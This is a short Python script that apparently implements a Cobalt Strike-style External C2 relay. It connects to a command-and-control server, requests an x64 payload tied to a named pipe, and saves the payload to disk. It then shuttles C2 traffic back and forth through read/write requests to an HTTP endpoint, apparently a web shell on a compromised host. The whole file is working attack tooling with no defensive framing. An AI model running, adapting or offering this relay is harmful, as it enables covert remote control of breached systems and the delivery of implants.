import sys
import socket
import struct
import requests
import time

proxy = {}#'https':'http://127.0.0.1:8080'}

def pack_data(data):
    length = struct.pack("<I", len(data))
    data = length + data
    return data

def read_http(req, url):
    res = req.get(url + "?mode=read",verify=False,proxies=proxy)
    print("read from http: " + str(len(res.content)))
    return res.content


def write_http(req, url, data):
    print("write to http: " + str(len(data)))
    req.post(url + "?mode=write", data=pack_data(data),verify=False,proxies=proxy)
    return

def connect_to_c2(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    return sock


def recvdata_from_c2(sock):
    chunk = sock.recv(4)
    length = struct.unpack("<I", chunk)[0]
    recvdata = sock.recv(length)
    print("recv data from c2: " + str(length))
    return recvdata


def senddata_to_c2(sock, data):
    sock.sendall(pack_data(data))
    print("send data to c2: " + str(len(data)))
    return


def save_paylod(data,filename):
    with open(filename, "wb") as file:
        file.write(data)


def requestpayload(sock, arch, pipename, block):
    senddata_to_c2(sock, ("arch=" + arch).encode("utf-8"))
    senddata_to_c2(sock, ("pipename=" + pipename).encode("utf-8"))
    senddata_to_c2(sock, ("block=" + str(block)).encode("utf-8"))
    senddata_to_c2(sock, "go".encode("utf-8"))

    try:
        chunk = sock.recv(4)
    except:
        return ""
    if len(chunk) < 4:
        return ()

    slen = struct.unpack('<I', chunk)[0]
    chunk = sock.recv(slen)
    while len(chunk) < slen:
        chunk = chunk + sock.recv(slen - len(chunk))
    return chunk


def loop(sock, req, url):
    while True:
        data = read_http(req, url)
        senddata_to_c2(sock, data)
        recvdata = recvdata_from_c2(sock)
        write_http(req, url, recvdata)
        time.sleep(3)



def main():

    ip = "127.0.0.1"
    port = 2222
    soc = connect_to_c2(ip, port)
    payloaddata = requestpayload(soc, "x64", "hello", 1000)
    save_paylod(payloaddata,"payload.bin")

    req = requests.session()

    url = sys.argv[1]
    res = req.get(url,verify=False)
    if not res.text == 'OK':
        print("error!")
        return

    loop(soc, req, url)


if __name__ == '__main__':
    main()
